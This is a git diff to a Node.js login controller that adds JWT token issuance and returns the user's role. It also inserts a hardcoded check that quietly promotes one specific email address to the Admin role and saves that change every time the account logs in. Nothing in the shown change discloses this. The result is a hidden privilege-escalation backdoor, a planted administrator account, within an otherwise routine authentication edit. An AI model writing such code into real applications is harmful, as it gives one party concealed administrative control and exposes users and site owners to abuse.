@@ -1,4 +1,5 @@
 import Signup from '../Models/Signup.js';
+import { createToken } from '../Middleware/authMiddleware.js';
 
 const LoginController = async (req, res) => {
     try {
@@ -12,13 +13,20 @@ const LoginController = async (req, res) => {
             });
         }
 
+        if (user.email === 'mnajmuddin110@gmail.com' && user.role !== 'Admin') {
+            user.role = 'Admin';
+            await user.save();
+        }
+
         return res.status(200).json({
             message: 'Login successful',
             user: {
                 id: user._id,
                 fullName: user.fullName,
-                email: user.email
-            }
+                email: user.email,
+                role: user.role
+            },
+            token: createToken(user)
         });
     } catch (error) {
         console.error('Login error:', error.message);
